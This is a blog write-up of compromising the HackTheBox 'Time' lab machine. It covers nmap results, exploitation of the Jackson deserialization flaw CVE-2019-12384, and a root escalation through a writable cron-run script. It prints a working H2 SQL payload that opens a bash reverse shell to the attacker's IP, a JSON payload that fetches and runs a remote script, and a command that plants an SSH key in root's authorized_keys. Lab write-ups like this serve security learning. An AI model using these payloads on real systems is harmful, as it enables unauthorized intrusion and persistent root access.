---
layout: post
title:  "HackTheBox Time Writeup" 
tags: hackthebox CVE-2019-12384
categories: hackthebox active-machine 
rel-img: /assets/img/htb/time/time.png
description: Exploiting CVE-2019-12384 to gain first access, make some basic linux enumeration to escalating priviledge and go to root!!
---

### Hackthebox Time Writeup
![Jewel](/assets/img/htb/time/time.png)

## Abstract

Exploiting CVE-2019-12384 to gain first access, make some basic linux enumeration to escalating priviledge and go to root!!

## Summary
1. Initial foothold
  - Nmap recon
  - Webapp enum
2. CVE-2019-12384
3. User Flag
4. Priviledge Escalation
5. Root Flag

## Initial foothold

### Nmap recon

```
sh4ck@kali:~$ sudo nmap -sS -p-  10.10.10.214 -vv
[sudo] password for sh4ck: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 14:33 CET
Initiating Ping Scan at 14:33
Scanning 10.10.10.214 [4 ports]
Completed Ping Scan at 14:33, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:33
Completed Parallel DNS resolution of 1 host. at 14:33, 0.06s elapsed
Initiating SYN Stealth Scan at 14:33
Scanning 10.10.10.214 [65535 ports]
Discovered open port 22/tcp on 10.10.10.214
Discovered open port 80/tcp on 10.10.10.214
Completed SYN Stealth Scan at 16:35, 7312.05s elapsed (65535 total ports)
Nmap scan report for 10.10.10.214
Host is up, received echo-reply ttl 63 (0.079s latency).
Scanned at 2020-10-25 14:33:45 CET for 7312s
Not shown: 59074 closed ports, 6459 filtered ports
Reason: 59074 resets, 6442 no-responses and 17 host-unreaches
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7312.25 seconds
           Raw packets sent: 123792 (5.447MB) | Rcvd: 87141 (8.569MB)
```

Nmap revealed that port 22 and 80 was opening. Browsing web application, it showed me a form that acted as json formatter/validator. 


![webapp home page](/assets/img/htb/time/time_home.png)

### Webapp enum

I tried to put a random word "hack" and choose validator (betas) in the menu. I got error message that showed me the processor used 

`Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'hack': was expecting ('true', 'false' or 'null')`

![cve-2019-12384](/assets/img/htb/time/cve-2019-12384.png)

Reading HTB official forum and a huge google-fu about fasterxml jackson vulnerabilities, i found repository with CVE-2019-12384 PoC  (https://github.com/jas502n/CVE-2019-12384)

Following repo i wrote my sql payload:

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;

CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.10/4545 0>&1')
```
and than i put it in my exposed server. In this way, when sql was called shellexec spwaned a reverse shell back to me.

So i opened nc listner, in the webapp form, i passed following payload and ran command with validator menu voice: 

`["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.219:8000/inject.sql'"}]`

this command downloaded and triggered sql file. After few seconds i got reverse shell:

```
sh4ck@kali:~$ nc -nlvp 4545
listening on [any] 4545 ...
connect to [10.10.14.219] from (UNKNOWN) [10.10.10.214] 35130
bash: cannot set terminal process group (833): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$
```

## User Flag

With pericles shell i got easily user.txt under home folder.

## Priviledge Escalation

I made some basic enumeration with linpeas and i monitored process with pspy. I realized that `/usr/bin/timer_backup.sh` was ran priodically by root and it was writable by user pericles.

```
2020/10/31 10:18:01 CMD: UID=0    PID=506193 | /bin/bash /usr/bin/timer_backup.sh 
2020/10/31 10:18:01 CMD: UID=0    PID=506195 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:01 CMD: UID=0    PID=506199 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:01 CMD: UID=0    PID=506198 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:01 CMD: UID=0    PID=506197 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:01 CMD: UID=0    PID=506196 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:02 CMD: UID=0    PID=506200 | mv website.bak.zip /root/backup.zip 
2020/10/31 10:18:02 CMD: UID=0    PID=506202 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:02 CMD: UID=0    PID=506201 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:11 CMD: UID=0    PID=506207 | 
2020/10/31 10:18:11 CMD: UID=0    PID=506229 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:11 CMD: UID=0    PID=506228 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:11 CMD: UID=0    PID=506227 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:11 CMD: UID=0    PID=506226 | /lib/systemd/systemd-udevd 
2020/10/31 10:18:11 CMD: UID=0    PID=506225 | zip -r website.bak.zip /var/www/html 
2020/10/31 10:18:11 CMD: UID=0    PID=506224 | /bin/bash /usr/bin/timer_backup.sh 
```

I figured out to modify this file to add my pub key into root's authorized keys.

## Root Flag

I started generating teo ssh key pair, than i copied my pub key on user home:

```
pericles@time:/home/pericles$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrXARvJMlSaHUDOkrHXzbNWt88Simzv3w+NYwfnY2Sg+osukVRoRxyu9cP9IxhGGbV8aYpjo+SkI1jnfCduBy+CgRTYRZ6yW6nv40W2omGCQgNuVBdVQDR3myPA5dTX3zp7YNWKReQctAv1Tg9FfKEiDgdcwgxeoW2qXvO8FjSQlJJBLxpPfeQqBryTGl8YEpTMV6bPQsCrwXnalIGrwAw7XvCPnD2scQgP8j6k37McaDR7hhIVOnsRm8QbFkhH6NTZY/BPp6P+6zoc9Ch/Q1RGDPgKmNskwvlbVLral0vNS6Dx4fnUXTESzCwdzLddlwY9U/4OY3wZIoG6fqb6cTkCVrgS0X4QribFGihaPAGvDuo2B8FiFe2MftxHhnY49DzEnrk/TYYB3VFOYtO+mTYo0dGPcvp11fKh/+OTJfb3UDX5MnZelfQbF65rvXPgPNZHmsyv6jkHNtwNF9bZ1h+OQJ2Q5PHtpCYEA9t8ZWlR6hI6bjRBPE18UhaTvdKGrE= sh4ck@kali" > /home/pericles/id_pub
<PE18UhaTvdKGrE= sh4ck@kali" > /home/pericles/id_pub
```
Finally i added new line to timer_backup.sh script, that appended my pub key to root-s authorized keys:

```
pericles@time:/home/pericles$ echo "cat /home/pericles/id_pub >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
```

After few minutes i was able to login as root with may priv key:

```
sh4ck@kali:~/Desktop/time_htb$ ssh -i id root@10.10.10.214
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 11 Nov 2020 09:40:43 AM UTC

  System load:             0.56
  Usage of /:              21.4% of 29.40GB
  Memory usage:            16%
  Swap usage:              0%
  Processes:               242
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.214
  IPv6 address for ens160: dead:beef::250:56ff:feb9:1763


83 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Oct 22 17:03:52 2020
root@time:~# ls -la
total 5812
drwx------  7 root root    4096 Nov 11 09:41 .
drwxr-xr-x 20 root root    4096 Nov 11 09:41 ..
-rw-r--r--  1 root root 5900858 Nov 11 09:41 backup.zip                                                                                                                                                                                    
lrwxrwxrwx  1 root root       9 Oct  2 13:46 .bash_history -> /dev/null                                                                                                                                                                    
-rw-r--r--  1 root root    3106 Dec  5  2019 .bashrc                                                                                                                                                                                       
drwx------  2 root root    4096 Sep 30 11:08 .cache                                                                                                                                                                                        
drwx------  3 root root    4096 Oct 22 17:47 .config                                                                                                                                                                                       
drwxr-xr-x  3 root root    4096 Sep 29 12:01 .local                                                                                                                                                                                        
-rw-r--r--  1 root root     161 Dec  5  2019 .profile                                                                                                                                                                                      
-r--------  1 root root      33 Nov 11 06:05 root.txt                                                                                                                                                                                      
-rw-r--r--  1 root root      66 Oct 22 08:45 .selected_editor                                                                                                                                                                              
drwxr-xr-x  3 root root    4096 Sep 20 12:07 snap                                                                                                                                                                                          
drwx------  2 root root    4096 Sep 20 12:07 .ssh                                                                                                                                                                                          
-rwxr--r--  1 root root      88 Oct 22 08:49 timer_backup.sh
```
so i caught root.txt
